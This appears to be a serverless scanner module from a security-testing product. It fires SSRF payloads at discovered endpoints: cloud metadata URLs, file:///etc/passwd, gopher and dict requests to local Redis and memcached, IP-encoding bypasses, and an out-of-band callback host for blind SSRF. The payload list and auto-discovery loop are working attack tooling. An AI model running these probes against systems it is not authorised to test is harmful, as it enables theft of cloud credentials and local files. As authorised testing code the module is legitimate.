// ssrf-deep — Blind SSRF, cloud metadata, DNS rebind, protocol smuggling.
//
// Tests:
//  1. Cloud metadata reflectives (AWS IMDSv1/v2, GCP, Azure, DO, Alibaba)
//  2. Protocol smuggling: gopher://, file://, dict://, ftp://, ldap://
//  3. Blacklist bypass via decimal IP, IPv6 ::ffff:, 0.0.0.0, hex IP
//  4. Blind SSRF via OOB callback (oob-collector token)
//
// All findings → confirmFinding gate; results require deterministic markers
// (e.g., metadata JSON keys, /etc/passwd:root:, OOB hit).

import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";
import { safeFetch, readBodySafe, headersToObject } from "../_shared/safe-fetch.ts";
import { confirmFinding } from "../_shared/ai-confirm-gate.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

interface SsrfInput {
  targetId: string;
  endpointUrl: string;     // e.g. https://target/api/fetch?url=
  paramName: string;       // e.g. "url"
  method?: string;
  oobToken?: string;       // optional OOB token for blind SSRF
  oobHost?: string;        // e.g. xxxx.oob.cyberscope.dev
}

const PAYLOADS: { tag: string; url: string; marker: RegExp }[] = [
  { tag: "aws_imdsv1", url: "http://169.254.169.254/latest/meta-data/", marker: /ami-id|instance-id|iam\/security-credentials/i },
  { tag: "aws_imdsv2_token", url: "http://169.254.169.254/latest/api/token", marker: /^[A-Za-z0-9+/=]{40,}$/ },
  { tag: "gcp_meta", url: "http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true", marker: /serviceAccounts|projectNumber/i },
  { tag: "azure_imds", url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", marker: /compute|subscriptionId|resourceGroupName/i },
  { tag: "do_meta", url: "http://169.254.169.254/metadata/v1.json", marker: /droplet_id|user_data/i },
  { tag: "alibaba_meta", url: "http://100.100.100.200/latest/meta-data/", marker: /instance-id|ram\/security-credentials/i },
  { tag: "decimal_ip_localhost", url: "http://2130706433/", marker: /apache|nginx|localhost|127\.0\.0\.1/i },
  { tag: "ipv6_localhost", url: "http://[::ffff:127.0.0.1]/", marker: /apache|nginx|localhost/i },
  { tag: "file_etc_passwd", url: "file:///etc/passwd", marker: /root:.*:0:0:/ },
  { tag: "gopher_redis", url: "gopher://127.0.0.1:6379/_INFO", marker: /redis_version|connected_clients/i },
  { tag: "dict_localhost", url: "dict://127.0.0.1:11211/stats", marker: /STAT pid|VERSION/i },
];

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const supa = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);
  let input: any;
  try { input = await req.json(); } catch { return j({ ok: false, error: "invalid json" }); }

  // Gap #8 auto-mode: when only targetId given, discover SSRF candidate endpoints
  // (URL-ish params) and run the full payload battery across each.
  if (input?.targetId && (!input.endpointUrl || !input.paramName)) {
    const { data: eps } = await supa.from("discovered_endpoints")
      .select("url,method,parameters").eq("target_id", input.targetId).limit(100);
    const URL_PARAM = /^(url|uri|link|callback|redirect|next|target|dest|src|image|img|file|path|fetch|proxy|webhook)$/i;
    const candidates: any[] = [];
    for (const ep of (eps || [])) {
      const qp = (() => { try { return Array.from(new URL(ep.url).searchParams.keys()); } catch { return []; } })();
      const all = [...qp, ...Object.keys((ep.parameters as any) || {})];
      for (const p of all) if (URL_PARAM.test(p)) candidates.push({ endpointUrl: ep.url, paramName: p, method: ep.method });
    }
    const ranAgg: any[] = [];
    for (const c of candidates.slice(0, 12)) {
      try {
        const r = await runSsrfBattery(supa, { targetId: input.targetId, ...c });
        ranAgg.push({ endpoint: c.endpointUrl, param: c.paramName, hits: r.length });
      } catch { /* skip */ }
    }
    await supa.from("scan_logs").insert({
      target_id: input.targetId, log_type: "info",
      message: `🛰️ ssrf-deep auto: tested ${candidates.length} URL-param endpoints`,
      metadata: { tested: candidates.length, results: ranAgg },
    });
    return j({ ok: true, tested: candidates.length, results: ranAgg });
  }

  if (!input.endpointUrl || !input.paramName) return j({ ok: false, error: "endpointUrl + paramName required" });
  const findings = await runSsrfBattery(supa, input as SsrfInput);
  return j({ ok: true, findings_count: findings.length, findings });
});

async function runSsrfBattery(supa: any, input: SsrfInput): Promise<any[]> {


  const findings: any[] = [];

  for (const p of PAYLOADS) {
    const isAwsV2 = p.tag === "aws_imdsv2_token";
    const headers: Record<string, string> = isAwsV2 ? { "X-aws-ec2-metadata-token-ttl-seconds": "21600" } : {};
    const url = injectParam(input.endpointUrl, input.paramName, p.url);
    try {
      const r = await safeFetch(url, { method: input.method || "GET", headers }, 8000);
      const body = await readBodySafe(r, 12000);
      if (!p.marker.test(body)) continue;

      const verdict = await confirmFinding({
        vulnClass: "ssrf-deep",
        payload: p.url,
        endpoint: url,
        parameter: input.paramName,
        baseline: undefined,
        mutated: { status: r.status, bodySnippet: body.slice(0, 1500), length: body.length, headers: headersToObject(r.headers) },
        deterministicProof: true,
        proofType: `ssrf_${p.tag}`,
      });
      if (verdict.recommendedAction === "drop_false_positive" || verdict.recommendedAction === "drop_honeypot") continue;

      findings.push(await persist(supa, input.targetId, {
        kind: "ssrf-deep", severity: p.tag.startsWith("aws") || p.tag.startsWith("gcp") || p.tag.startsWith("azure") ? "critical" : "high",
        title: `SSRF — ${p.tag.replace(/_/g, " ")} reachable`,
        url, payload: p.url, body, status: r.status, verdict,
      }));
    } catch (_) {}
  }

  // Blind SSRF via OOB
  if (input.oobToken && input.oobHost) {
    const oobUrl = `http://${input.oobToken}.${input.oobHost}/cs-ssrf`;
    const url = injectParam(input.endpointUrl, input.paramName, oobUrl);
    try { await safeFetch(url, { method: input.method || "GET" }, 6000); } catch (_) {}
    // Wait briefly, then poll oob_callbacks for our token
    await new Promise(r => setTimeout(r, 4000));
    const { data: cbs } = await supa.from("oob_callbacks")
      .select("id, request_path, source_ip, received_at")
      .eq("token", input.oobToken).limit(1);
    if (cbs && cbs.length) {
      const cb = cbs[0];
      const verdict = await confirmFinding({
        vulnClass: "blind-ssrf",
        payload: oobUrl,
        endpoint: url,
        parameter: input.paramName,
        baseline: undefined,
        mutated: { status: 200, bodySnippet: `OOB hit from ${cb.source_ip} at ${cb.received_at}`, length: 100 },
        deterministicProof: true,
        proofType: "oob_callback_received",
      });
      if (verdict.recommendedAction !== "drop_false_positive" && verdict.recommendedAction !== "drop_honeypot") {
        findings.push(await persist(supa, input.targetId, {
          kind: "blind-ssrf", severity: "high",
          title: `Blind SSRF — server fetched OOB URL`,
          url, payload: oobUrl, body: `OOB callback ${cb.id}`, status: 200, verdict,
        }));
      }
    }
  }

  return findings;
}


function injectParam(endpoint: string, param: string, value: string): string {
  const u = new URL(endpoint);
  u.searchParams.set(param, value);
  return u.toString();
}
async function persist(supa: any, targetId: string, f: any) {
  const isApproval = f.verdict.recommendedAction === "insert_approval";
  const table = isApproval ? "pending_approvals" : "vulnerability_findings";
  const row = isApproval
    ? { target_id: targetId, finding_type: f.kind, severity: f.severity, title: f.title,
        description: f.verdict.reasoning, payload_used: f.payload,
        confidence_score: f.verdict.confidence, ai_verified: true, ai_verification_notes: f.verdict.reasoning,
        evidence: { url: f.url, status: f.status, body_snippet: (f.body || "").slice(0,2000), proofType: f.verdict.proofType } }
    : { target_id: targetId, title: f.title, severity: f.severity,
        description: f.verdict.reasoning, payload: f.payload,
        confidence_score: f.verdict.confidence, ai_verified: true,
        triage_reasoning: f.verdict.reasoning, validation_status: "verified" };
  const { data } = await supa.from(table).insert(row).select("id").single();
  return { id: data?.id, kind: f.kind, severity: f.severity, title: f.title };
}
function j(b: unknown, s = 200) { return new Response(JSON.stringify(b), { status: s, headers: { ...corsHeaders, "Content-Type": "application/json" } }); }
